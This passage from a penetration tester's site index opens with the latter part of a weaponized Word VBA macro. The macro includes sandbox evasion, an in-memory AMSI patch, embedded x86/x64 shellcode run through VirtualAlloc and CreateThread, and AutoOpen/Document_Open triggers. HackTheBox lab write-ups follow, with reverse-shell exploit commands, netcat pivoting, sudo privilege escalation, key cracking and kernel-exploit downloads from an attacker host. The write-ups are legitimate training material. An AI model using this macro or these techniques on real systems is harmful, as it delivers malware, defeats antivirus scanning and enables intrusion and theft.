Timein = Date + myTime Sleep (4000) Dim second_time second_time = Time Dim Timeout As Date Timeout = Date + second_time Dim subtime As Variant subtime = DateDiff(\"s\", Timein, Timeout) Dim vOut As Integer vOut = CInt(subtime) If subtime &lt; 3.5 Then    Exit Function End If 'initialize variables Dim Is64 As Boolean Dim StrFile As String Dim check As Boolean Dim buf As Variant Dim addr As LongPtr Dim counter As LongPtr Dim data As String Dim res As LongPtr Dim ipcheck As Boolean ipcheck = False Dim inscope As String 'define in scope IP's.  We can use wildcards here. inscope = \"192.168.*\" 'Call ip check function.  Returns True if machine IP is in scope. If True, pass.  If False, exit. ipcheck = getMyIP(inscope) If ipcheck Then Else    Exit Function End If 'Dynamically resolve amsi.dll StrFile = Dir(\"c:\\windows\\system32\\a?s?.d*\") 'Call architecture function to determine if we are in 32 bit or 64 bit word. 64 bit returns True. Is64 = arch() 'Call amsi check function to determine if amsi.dll is loaded into Word. This is the case in word 2019+. Returns True if Amsi is found. check = amcheck(StrFile) 'This portion to delete document body and replace with auto text (the \"legit\" content) 'ActiveDocument.Content.Select 'Selection.Delete 'ActiveDocument.AttachedTemplate.AutoTextEntries(\"TheDoc\").Insert Where:=Selection.Range, RichText:=True 'If amsi is found, call amsi patching function.  Pass architecture of Word as additional arg to function. If check Then     patch StrFile, Is64 End If 'Include shellcode for both x86 and x64. 'also no encryption routine on this shellcode, might have to look into something like xor or rot or caeser cipher to strengten it If Is64 Then    buf = Array(49, 125, 184, 25, 37, 29, 1, 53, 53, 53, 118, 134, 118, 133, 135, 125, 102, 7, 154, 125, 192, 135, 149, 125, 192, 135, 77, 125, 192, 135, 85, 134, 139, 125, 68, 236, 127, 127, 125, 192, 167, 133, 130, 102, 254, 125, 102, 245, 225, 113, _\t150, 177, 55, 97, 85, 118, 246, 254, 66, 118, 54, 246, 23, 34, 135, 125, 192, 135, 85, 118, 134, 192, 119, 113, 125, 54, 5, 155, 182, 173, 77, 64, 55, 68, 186, 167, 53, 53, 53, 192, 181, 189, 53, 53, 53, 125, 186, 245, 169, 156, _\t125, 54, 5, 133, 192, 125, 77, 121, 192, 117, 85, 126, 54, 5, 24, 139, 130, 102, 254, 125, 52, 254, 118, 192, 105, 189, 125, 54, 11, 125, 102, 245, 118, 246, 254, 66, 225, 118, 54, 246, 109, 21, 170, 38, 129, 56, 129, 89, 61, 122, _\t110, 6, 170, 13, 141, 121, 192, 117, 89, 126, 54, 5, 155, 118, 192, 65, 125, 121, 192, 117, 81, 126, 54, 5, 118, 192, 57, 189, 118, 141, 125, 54, 5, 118, 141, 147, 142, 143, 118, 141, 118, 142, 118, 143, 125, 184, 33, 85, 118, 135, _\t52, 21, 141, 118, 142, 143, 125, 192, 71, 30, 128, 52, 52, 52, 146, 125, 102, 16, 136, 126, 243, 172, 158, 163, 158, 163, 154, 169, 53, 118, 139, 125, 190, 22, 126, 252, 247, 129, 172, 91, 60, 52, 10, 136, 136, 125, 190, 22, 136, 143, _\t130, 102, 245, 130, 102, 254, 136, 136, 126, 239, 111, 139, 174, 220, 53, 53, 53, 53, 52, 10, 29, 67, 53, 53, 53, 102, 110, 103, 99, 102, 107, 109, 99, 105, 110, 99, 107, 107, 53, 143, 125, 190, 246, 126, 252, 245, 240, 54, 53, 53, _\t130, 102, 254, 136, 136, 159, 56, 136, 126, 239, 140, 190, 212, 251, 53, 53, 53, 53, 52, 10, 29, 8, 53, 53, 53, 100, 120, 161, 155, 101, 109, 138, 157, 148, 121, 130, 150, 169, 119, 107, 172, 123, 175, 101, 171, 125, 137, 134, 173, 151, _\t155, 125, 124, 119, 108, 175, 148, 142, 161, 133, 119, 106, 134, 127, 106, 106, 134, 136, 134, 138, 170, 109, 158, 132, 131, 109, 153, 154, 105, 137, 165, 125, 124, 163, 125, 143, 159, 155, 128, 150, 158, 164, 133, 109, 121, 160, 129, 135, 134, 157, _\t124, 120, 105, 139, 106, 163, 164, 128, 158, 156, 143, 165, 158, 141, 150, 166, 136, 109, 148, 162, 142, 124, 142, 109, 155, 153, 173, 174, 98, 109, 148, 159, 142, 135, 106, 125, 150, 167, 130, 143, 167, 152, 141, 119, 134, 132, 124, 167, 102, 162, _\t159, 160, 123, 126, 169, 163, 110, 131, 107, 155, 159, 109, 103, 165, 153, 168, 174, 138, 161, 105, 109, 165, 105, 142, 163, 98, 158, 173, 173, 162, 172, 125, 133, 164, 170, 107, 173, 139, 155, 153, 160, 162, 122, 170, 125, 168, 122, 137, 133, 157, _\t158, 155, 123, 158, 167, 133, 135, 175, 170, 134, 107, 156, 150, 121, 165, 133, 168, 155, 119, 148, 131, 132, 102, 106, 126, 165, 125, 110, 160, 120, 150, 134, 125, 157, 142, 53, 125, 190, 246, 136, 143, 118, 141, 130, 102, 254, 136, 125, 237, 53, _\t103, 221, 185, 53, 53, 53, 53, 133, 136, 136, 126, 252, 247, 32, 138, 99, 112, 52, 10, 125, 190, 251, 159, 63, 148, 125, 190, 38, 159, 84, 143, 135, 157, 181, 104, 53, 53, 126, 190, 21, 159, 57, 118, 142, 126, 239, 170, 123, 211, 187, _\t53, 53, 53, 53, 52, 10, 130, 102, 245, 136, 143, 125, 190, 38, 130, 102, 254, 130, 102, 254, 136, 136, 126, 252, 247, 98, 59, 77, 176, 52, 10, 186, 245, 170, 84, 125, 252, 246, 189, 72, 53, 53, 126, 239, 121, 37, 106, 21, 53, 53, _\t53, 53, 52, 10, 125, 52, 4, 169, 55, 32, 223, 29, 138, 53, 53, 53, 136, 142, 159, 117, 143, 126, 190, 6, 246, 23, 69, 126, 252, 245, 53, 69, 53, 53, 126, 239, 141, 217, 136, 26, 53, 53, 53, 53, 52, 10, 125, 200, 136, 136, _\t125, 190, 28, 125, 190, 38, 125, 190, 15, 126, 252, 245, 53, 85, 53, 53, 126, 190, 46, 126, 239, 71, 203, 190, 23, 53, 53, 53, 53, 52, 10, 125, 184, 249, 85, 186, 245, 169, 231, 155, 192, 60, 125, 54, 248, 186, 245, 170, 7, 141, _\t248, 141, 159, 53, 142, 126, 252, 247, 37, 234, 215, 139, 52, 10) Else    buf = Array(141,153,254,113,113,113,17,64,163,248,148,21,250,35,65,250,35,125,250,35,101,64,142,126,198,59,87,250,3,89,64,177,221,77,16,13,115,93,81,176,190,124,112,182,56,4,158,35,38,250,35,97,250,51,77,112,161,250,49,9,244,177,5,61,112,161,250,41,81,33,250,57,105,112,162,244,184,5,77,56,64, _142,250,69,250,112,167,64,177,176,190,124,221,112,182,73,145,4,133,114,12,137,74,12,85,4,145,41,250,41,85,112,162,23,250,125,58,250,41,109,112,162,250,117,250,112,161,248,53,85,85,42,42,16,40,43,32,142,145,41,46,43,250,99,152,241,142,142,142,44,25,31,20,5,113,25,6,24,31,24,37, _25,61,6,87,118,142,164,64,170,34,34,34,34,34,153,79,113,113,113,60,30,11,24,29,29,16,94,68,95,65,81,89,38,24,31,21,30,6,2,81,63,37,81,71,95,64,74,81,37,3,24,21,20,31,5,94,70,95,65,74,81,3,7,75,64,64,95,65,88,81,29,24,26,20,81,54,20,18,26,30, _113,25,75,39,8,214,142,164,34,34,27,114,34,34,25,202,112,113,113,153,30,112,113,113,94,24,64,16,61,50,92,11,54,19,37,19,7,60,20,69,6,27,41,64,29,32,22,2,11,60,54,23,92,56,38,1,61,38,64,92,16,3,19,65,64,8,55,37,54,69,21,39,25,57,11,8,71,61,3,3, _34,36,26,4,60,58,70,27,26,51,32,35,56,58,64,30,8,73,72,53,38,30,33,68,59,6,66,62,62,72,16,9,70,46,52,55,2,7,40,5,43,26,19,9,61,51,32,16,21,41,20,32,25,0,67,4,24,33,72,2,72,46,29,66,71,29,21,7,30,21,59,22,57,55,39,4,39,3,60,59, _21,46,27,20,60,20,2,18,64,4,29,58,41,30,67,28,27,52,50,59,65,37,60,51,25,55,64,41,51,56,46,58,67,32,34,8,53,28,66,22,2,20,24,11,60,32,20,2,34,16,25,65,18,68,41,37,52,28,5,43,69,51,51,36,20,72,46,0,31,0,4,55,64,37,11,7,6,26,59,46, _43,18,34,46,32,60,26,58,28,26,3,72,4,8,28,59,25,4,62,33,46,2,9,69,27,68,29,113,33,25,38,248,238,183,142,164,248,183,34,25,113,115,25,245,34,34,34,38,34,39,25,154,36,95,74,142,164,231,27,123,46,34,34,34,34,39,25,92,119,105,10,142,164,244,177,4,101,25,249,98, _113,113,25,53,129,68,145,142,164,62,4,144,153,59,113,113,113,27,49,25,113,97,113,113,25,113,113,49,113,34,25,41,213,34,148,142,164,226,34,34,248,150,38,25,113,81,113,113,34,39,25,99,231,248,147,142,164,244,177,5,190,250,118,112,178,244,177,4,148,41,178,46,153,14,142,142,142,64,72,67, _95,64,71,73,95,69,72,95,71,71,113,202,145,108,91,123,25,215,228,204,236,142,164,77,119,13,123,241,138,145,4,116,202,54,98,3,30,27,113,34,142,164)End If'Create new space in memory within current process addr = VirtualAlloc(0, UBound(buf), &amp;H3000, &amp;H40) 'Copy shellcode to newly created memory For counter = LBound(buf) To UBound(buf) data = Hex(buf(counter)) patched ByVal (addr + counter), 1, ByVal (\"&amp;H\" &amp; data) Next counter 'create thread to execute shellcode res = CreateThread(0, 0, addr, 0, 0, 0)End Function Function arch() As Boolean 'check architecture of current word process    #If Win64 Then        arch = True    #Else        arch = False    #End IfEnd FunctionPublic Function getMyIP(ipcheck As String) As Boolean'uses WMI to get all IP's associated with machine.  Each one is then checked against the wildcarded IP/network.  If a match is found, returns True    Dim objWMI As Object    Dim objQuery As Object    Dim objQueryItem As Object    Dim vIpAddress    Dim counter As Integer    Dim ips() As String    Set objWMI = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")    Set objQuery = objWMI.ExecQuery(\"Select * from Win32_NetworkAdapterConfiguration Where IPEnabled = True\")    For Each objQueryItem In objQuery        For Each vIpAddress In objQueryItem.ipaddress            If CStr(vIpAddress) Like ipcheck Then                getMyIP = True            End If        Next    NextEnd FunctionFunction amcheck(StrFile As String) As Boolean'Checks for amsi.dll in word process. If found, returns TrueDim szProcessName As StringDim mdi As MODULEINFODim hMod(0 To 1023) As LongPtrDim res As LongPtramcheck = Falseres = EnumProcessModulesEx(-1, hMod(0), 1024, cbNeeded, &amp;H3)For i = 0 To UBound(hMod)    szProcessName = String$(50, 0)    GetModuleBaseName -1, hMod(i), szProcessName, Len(szProcessName)    If Left(szProcessName, 8) = StrFile Then        amcheck = True   End IfNext iEnd FunctionFunction patch(StrFile As String, Is64 As Boolean)'patches amsi.dll in memory in order to disable it.  Loads memory address of amsi.dll and then locates the AmsiUacInitialize function within it.  The AmsiScanBuffer and AmsiScanString functions are located via relative offset from AmsiUacInitialize and then overwritten with a nop and then a ret to disable them. ' Depending on architecture these offsets vary, so a case is included for x86 and x64Dim lib As LongPtrDim Func_addr As LongPtrDim temp As LongPtrDim old As LongPtrDim off As Integerlib = getmod(StrFile)If Is64 Then    off = 96Else    off = 80End IfFunc_addr = GetPrAddr(lib, \"Am\" &amp; Chr(115) &amp; Chr(105) &amp; \"U\" &amp; Chr(97) &amp; \"c\" &amp; \"Init\" &amp; Chr(105) &amp; Chr(97) &amp; \"lize\") - offtemp = VirtPro(ByVal Func_addr, 32, 64, 0)patched ByVal (Func_addr), 1, ByVal (\"&amp;H\" &amp; \"90\")patched ByVal (Func_addr + 1), 1, ByVal (\"&amp;H\" &amp; \"C3\")temp = VirtPro(ByVal Func_addr, 32, old, 0)If Is64 Then    off = 352Else    off = 256End IfFunc_addr = GetPrAddr(lib, \"Am\" &amp; Chr(115) &amp; Chr(105) &amp; \"U\" &amp; Chr(97) &amp; \"c\" &amp; \"Init\" &amp; Chr(105) &amp; Chr(97) &amp; \"lize\") - offtemp = VirtPro(ByVal Func_addr, 32, 64, old)patched ByVal (Func_addr), 1, ByVal (\"&amp;H\" &amp; \"90\")patched ByVal (Func_addr + 1), 1, ByVal (\"&amp;H\" &amp; \"C3\")temp = VirtPro(ByVal Func_addr, 32, old, 0)End Function'macro name is test which calls the main methodSub test() MyMacroEnd SubSub AutoOpen()    MyMacroEnd SubSub Document_Open()    MyMacroEnd Sub",
        "url": "/xdev/macros/"
      }
      ,
    
      "htb-vault": {
        "title": "HackTheBox - Vault",
        "author": "",
        "category": "",
        "content": "Vault is easily one of my favourite boxes on htb. It taught me a lot about tunneling and moving through a network any way possible. This is one of the boxes i got truely stuck into for days and could not stop thinking about what the next move was.Initial Nmap scanPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Site doesn't have a title (text/html; charset=UTF-8).No exact OS matches for hostFirst webappThe initial webapp doesnt give too much away but what it does say is enough.Welcome to the Slowdaddy web interfaceWe specialise in providing financial orginisations with strong web and database solutions and we promise to keep your customers financial data safe.We are proud to announce our first client: Sparklays (Sparklays.com still under construction) We can infer from this that ‘sparklays’ will be a directory, we can add this to our directory bruteforcer to find the relevant files./sparklays/admin.php - login prompt/sparklays/login.php - ‘access denied’/sparklays/design/uploads - file uploadLanding a shellTesting some file uploads, its clear we cant upload anything with a .php extension, .php5 however, works just fine. Navigating to the page with our file executes and we get our meterpreter session.The directory listing on the server is as follows:home/alexhome/dave\tservers.txt;\t\tDNS + Configurator - 192.168.122.4\t\tFirewall - 192.168.122.5\t\tThe Vault - x\tkey.txt;\t\titscominghome\tssh.txt;\t\tDav3therav3123Second webappWe now have ssh creds for dave. We can now tunnel to access that page we couldnt reach before.ssh -L 8888:192.168.122.4:80 dave@10.10.10.109This page looks to be a testing page for a vpn config. Theres also a /notes directory which contains the followingchmod 123.ovpn and script.sh to 777I found this handy guide on the best way to exploit this vpn testing page for code execution (link)We can use nc as a listener on daves system because where in the dns. Now we land as root @ dns and we can get the user flag.Theres a new ssh file in the dave directory on the dns now.theres also a ‘ssh’ file in the dave dirroot@DNS:/home/dave# cat sshcat sshdavedav3gerous567Looks like a password or something but doesnt work on the initial site. We will have to keep it for later.breakpoint 1At this point, what do we know.  We are root@dns when we want  We know there is an alex user  We have unused passwords;          itscominghome      dav3gerous567        We have the address of vault - 192.168.5.2Getting to the endChecking /var/log/auth.log we get an interesting result.root : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/ncat -l 1235 --sh-exec ncat 192.168.5.2 987 -p 53From this we get an idea of what we have to do. We have to use netcat to inject another netcat for us to connect to.sudo ncat -l 1234 --sh-exec \"ncat 192.168.5.2 987 -p 53\" &amp;use the ampersand to background itssh dave@192.168.122.4 -p 1234    we get in    dave@vault:~$ lsroot.txt.gpgWe have our root flag right here but we cant decrypt yet.We will have to move it from vault &gt; dns &gt; ubuntu.Root flagoh jeez, weve come this far, and now we need to go back.We have a GPG encrypted file (root flag) but the key is on the first system, since gpg works the way it works, we have to move it to that first system where the key is.I chose to move the file with scp but in hindsight there was probably a better way of doing this.dave@DNS:/tmp$ scp -P 1331 dave@192.168.122.4:/home/dave/root.txt.gpg /tmpThe authenticity of host '[192.168.122.4]:1331 ([192.168.122.4]:1331)' can't be established.ECDSA key fingerprint is SHA256:Wo70Zou+Hq5m/+G2vuKwUnJQ4Rwbzlqhq2e1JBdjEsg.Are you sure you want to continue connecting (yes/no)? ysePlease type 'yes' or 'no': yesWarning: Permanently added '[192.168.122.4]:1331' (ECDSA) to the list of known hosts.dave@192.168.122.4's password: root.txt.gpg                                                                                                                                      100%  629     0.6KB/s   00:00    [1]+  Done                    sudo ncat -l 1331 --sh-exec \"ncat 192.168.5.2 987 -p 4444\"dave@ubuntu:~$ scp dave@192.168.122.4:/tmp/root.txt.gpg .dave@192.168.122.4's password: root.txt.gpg                                                                                                                                      100%  629     0.6KB/s   00:00    dave@ubuntu:~$ gpg -d root.txt.gpgYou need a passphrase to unlock the secret key foruser: \"david &lt;dave@david.com&gt;\"4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24      \"david &lt;dave@david.com&gt;\"&lt;flag redacted&gt;Once back on the first system and decoding the flag, gpg asks for a password and weve had it all this timeDecrypting with the key gives us our flag to submit.",
        "url": "/htb/vault/"
      }
      ,
    
      "htb-valentine": {
        "title": "HackTheBox - Valentine",
        "author": "",
        "category": "",
        "content": "This was actually my first ever rooted box on htb!Nmap scanPORT    STATE SERVICE  VERSION22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))|_http-server-header: Apache/2.2.22 (Ubuntu)|_http-title: Site doesn't have a title (text/html).443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))|_http-title: Site doesn't have a title (text/html).| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US| Not valid before: 2018-02-06T00:45:25|_Not valid after:  2019-02-06T00:45:25|_ssl-date: 2018-12-04T12:02:14+00:00; -1m32s from scanner time.No exact OS matches for hostpwning user.The index page for the website shows an image of a bleeding heart. Hinting at heartbleed and hence the ssl site. Poking around the site we find a encode.php and decode.php which seems to just do hex en/decoding.Directory bruteforcing also reveals a /dev/ directory which contains a private key when decoded.Running a heartbleed script from github will leak a base64 string eventually (may take some attempts). I also tried using a metasploit module but it kept throwing a random md5 string which led me down a rabbithole.aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg===&gt; heartbleedbelievethehypeOnce we chmod 600 the private key we can try login to the box as user ‘hype’ and once we supply the key and password we get a ssh sessionGetting rootChecking the system version was the first thing i did on the box.Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/LinuxThis kernel looks old. It also fits the timeframe for dirtycow to work. Downloading the exploit from github editing it to change the username, uploading it to the box with wget and simplehttpserver and running it eventually will do what it has to.Once it has finished, log back into ssh as hype and the password supplied in the exploit. Should be root.hype@Valentine:~# id -auid=0(hype) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),124(sambashare)Can now grab that root flag.",
        "url": "/htb/valentine/"
      }
      ,
    
      "htb-tenten": {
        "title": "HackTheBox - Tenten",
        "author": "",
        "category": "",
        "content": "Nmap scanPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-generator: WordPress 4.7.3|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Job Portal &amp;#8211; Just another WordPress siteWarning: OSScan results may be unreliableWebapp recon &amp; pwnNmap scan leaks wordpress as a title. Wpscan returns a vulnerable plugin = ‘job manager’ and two users, ‘takis’ &amp; ‘zesk’.Reading about the vulnerable plugin, it seems we can enumerate the site with the plugin.We can fuzz this param with a basic bash oneliner.or i in $(seq 1 15); do echo -n \" $i \"; curl -s http://10.10.10.10/index.php/jobs/apply/$i/ | grep '&lt;title&gt;'; done 1 &lt;title&gt;Job Application: Hello world! &amp;#8211; Job Portal&lt;/title&gt; 2 &lt;title&gt;Job Application: Sample Page &amp;#8211; Job Portal&lt;/title&gt; 3 &lt;title&gt;Job Application: Auto Draft &amp;#8211; Job Portal&lt;/title&gt; 4 &lt;title&gt;Job Application &amp;#8211; Job Portal&lt;/title&gt; 5 &lt;title&gt;Job Application: Jobs Listing &amp;#8211; Job Portal&lt;/title&gt; 6 &lt;title&gt;Job Application: Job Application &amp;#8211; Job Portal&lt;/title&gt; 7 &lt;title&gt;Job Application: Register &amp;#8211; Job Portal&lt;/title&gt; 8 &lt;title&gt;Job Application: Pen Tester &amp;#8211; Job Portal&lt;/title&gt; 9 &lt;title&gt;Job Application:  &amp;#8211; Job Portal&lt;/title&gt; 10 &lt;title&gt;Job Application: Application &amp;#8211; Job Portal&lt;/title&gt; 11 &lt;title&gt;Job Application: cube &amp;#8211; Job Portal&lt;/title&gt; 12 &lt;title&gt;Job Application: Application &amp;#8211; Job Portal&lt;/title&gt; 13 &lt;title&gt;Job Application: HackerAccessGranted &amp;#8211; Job Portal&lt;/title&gt; 14 &lt;title&gt;Job Application: Application &amp;#8211; Job Portal&lt;/title&gt; 15 &lt;title&gt;Job Application: temp_logo_testing &amp;#8211; Job Portal&lt;/title&gt;‘hackeraccessgranted’ looks interesting, as if someones already pwned the app. Visiting the page shows an image.We can get the image with wget and start poking steganography techniques at it. Steghide yields somethingsteghide extract -sf HackerAccessGranted.jpg Enter passphrase: &lt;blank&gt; wrote extracted data to \"id_rsa\".File we retrieve is a private rsa key which has been encrypted. ssh2john can help us out.ssh2john id_rsa &gt; id.encryptedroot@kali:~/htb/tenten# john id.encrypted --wordlist=/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA 32/64])Press 'q' or Ctrl-C to abort, almost any other key for statussuperpassword    (id_rsa)1g 0:00:00:00 DONE (2018-12-12 22:32) 1.123g/s 876444p/s 876444c/s 876444C/s superpasswordUse the \"--show\" option to display all of the cracked passwords reliablySession completedChmod 600 the file and login with takis user we found before.Gaining root.Again a sudo check reveals all.takis@tenten:~$ sudo -lMatching Defaults entries for takis on tenten:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser takis may run the following commands on tenten:    (ALL : ALL) ALL    (ALL) NOPASSWD: /bin/fuckinIt seems our current user can run the binary ‘fuckin’ without a password. Looking at the binary, we can see its simply calling bash with root permissions so we can abuse this to read the root file.takis@tenten:/bin$ sudo fuckin iduid=0(root) gid=0(root) groups=0(root)takis@tenten:/bin$ sudo fuckin cat /root/root.txt&lt;redacted&gt;done and dusted.",
        "url": "/htb/tenten/"
      }
      ,
    
      "htb-solidstate": {
        "title": "HackTheBox - Solidstate",
        "author": "",
        "category": "",
        "content": "Solid state was the first box i did on htb that had the vector of email harvesting, learnt a lot about what not to keep in emails .Nmap scanPORT     STATE SERVICE     VERSION22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)| ssh-hostkey: |   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)25/tcp   open  smtp        JAMES smtpd 2.3.2|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.6 [10.10.14.6]), 80/tcp   open  http        Apache httpd 2.4.25 ((Debian))|_http-server-header: Apache/2.4.25 (Debian)|_http-title: Home - Solid State Security110/tcp  open  pop3        JAMES pop3d 2.3.2119/tcp  open  nntp        JAMES nntpd (posting ok)4555/tcp open  james-admin JAMES Remote Admin 2.3.2Hello JAMESThe initial webpage yields nothing of interest at all. Enumerating the other running services gives us something. JAMES 2.3.2, a service critically flawed. We can login with root:root and from there we can enumerate users.--------------------------------------------------------JAMES Remote Administration Tool 2.3.2Please enter your login and passwordLogin id:rootPassword:rootWelcome root. HELP for a list of commandslistusersExisting accounts 5user: jamesuser: thomasuser: johnuser: mindyuser: mailadmin--------------------------------------------------------------Due to pop3 being open on the box, it looks like we will have to harvest emails. JAMES service actually allows us to reset users passwords with ‘setpassword’. From there we can use a mail client like thunderbird to login as them and view their mail.User ‘mindy’ has an email in her inbox containing ssh credentials.Landing rootThe initial ssh shell is running rbash, we can escape this simply by typing bash and / or calling a new shell with python.Looking around freely now, we find a python file in /tmp which runs as root.#!/usr/bin/env pythonimport osimport systry:     os.system('rm -r /tmp/*')except:     sys.exit()As you can see, its running system in python as root. Perfectly secure. Simply change the ‘rm’ to a shell and get root when the cron fires off.",
        "url": "/htb/solidstate/"
      }
      ,
    
      "htb-shocker": {
        "title": "HackTheBox - Shocker",
        "author": "",
        "category": "",
        "content": "DescriptionShellshock was another basic machine that kind of gave away the vectors for each step with ease.Nmap scanPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Site doesn't have a title (text/html).2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)| 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)|_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)No exact OS matches for host (If you know what OS is running on itInitial shellAs the box name implies, this box probably involves shellshock. A directory bruteforce reveals very little, only a ‘cgi-bin’ directory. Searchsploit search for shellshock comes up with:Apache mod_cgi = 'shellshock' Remote Command Injection | exploits/linux/remote/34900.py'Reading the documentation / exploit, we can figure out how to supply it with the arguments we need to yield a shell.python 34900.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.5 lport=1337 pages=/cgi-bin/user.shRunning the above gains us a low privileged shell and we can collect the user.txt flag.Privilege escalationA simple ‘sudo -l’ check reveals our privesc vector.(root) NOPASSWD: /usr/bin/perlthis tells us we can run perl as root without supplying a password, easy.10.10.10.56&gt; sudo perl -e 'exec \"/bin/bash\";'10.10.10.56&gt; iduid=0(root) gid=0(root) groups=0(root)And there we go full privileges with a simple perl shell call.",
        "url": "/htb/shocker/"
      }
      ,
    
      "htb-sense": {
        "title": "HackTheBox - Sense",
        "author": "",
        "category": "",
        "content": "Sense was another box that you can smash out in 10 minutes you might have spare. Not much to be learnt from this one as it was very straight forward.Nmap scanPORT STATE SERVICE VERSION80/tcp open http lighttpd 1.4.35|_http-server-header: lighttpd/1.4.35|_http-title: Did not follow redirect to https://10.10.10.60/443/tcp open ssl/https?|_ssl-date: TLS randomness does not represent timeNavigating to the webserver we get shown a pfsense login page and not much else.Wfuzz resultswfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --hc 404,301 https://10.10.10.60/FUZZ.txt001197: C=200 9 L 40 W 271 Ch \"changelog\"112347: C=200 6 L 12 W 106 Ch \"system-users\"Changelog indicates the current version is vulnerable to something. system-users indicates the username ‘rohit’ and ‘company-default’ exist. Trying the username rohit and pfsense default password of ‘pfsense’ lets us in.ExploitationSearching for an exploit with this platform returns a metasploit module that fits our needs, filling in the details we know we can run the exploit.msf exploit(unix/http/pfsense_graph_injection_exec) &gt; set RHOST 10.10.10.60RHOST =&gt; 10.10.10.60msf exploit(unix/http/pfsense_graph_injection_exec) &gt; set USERNAME rohitUSERNAME =&gt; rohitmsf exploit(unix/http/pfsense_graph_injection_exec) &gt; set LHOST tun0LHOST =&gt; 10.10.14.6msf exploit(unix/http/pfsense_graph_injection_exec) &gt; exploitThe above exploit yields a root level shell so theres no need to extend privileges.",
        "url": "/htb/sense/"
      }
      ,
    
      "htb-popcorn": {
        "title": "HackTheBox - Popcorn",
        "author": "",
        "category": "",
        "content": "Nmap scan22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))|_http-server-header: Apache/2.2.12 (Ubuntu)|_http-title: Site doesn't have a title (text/html).Dirsearch results[06:17:51] 200 -  177B  - /[06:17:52] 200 -  177B  - /index[06:18:00] 200 -   48KB - /test[06:18:28] 301 -  310B  - /torrent  -&gt;  http://10.10.10.6/torrent/[06:19:31] 301 -  309B  - /rename  -&gt;  http://10.10.10.6/rename/Webapp things‘/torrent’ from the directory bruteforce looks interesting, it directs to a torrent hosting site. There is capability to upload files but we cant due to being unauthenticated. Luckily theres also a signup form so we can be authenticated.Attempting a straight file upload with a php shell and typical bypasses didnt end up working out. Since the name mentions torrents, i tried a torrent file such as the default kali torrent. This file works just fine. After uploading theres an option to upload an image along with the file. This time appending .png to our php shell allows us to get a connection once we navigate to ‘/torrent/uploads’Getting rootDigging around searchsploit and exploitdb for a kernel exploit was an idea because the kernel is dated as 2009.“Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - 'Full-Nelson.c' Local Privilege Escalation”Use wget on the box to get the file, compile and execute to gain root.www-data@popcorn:/dev/shm$ wget http://10.10.14.6:8000/15704.cwget http://10.10.14.6:8000/15704.c--2018-12-04 13:35:08--  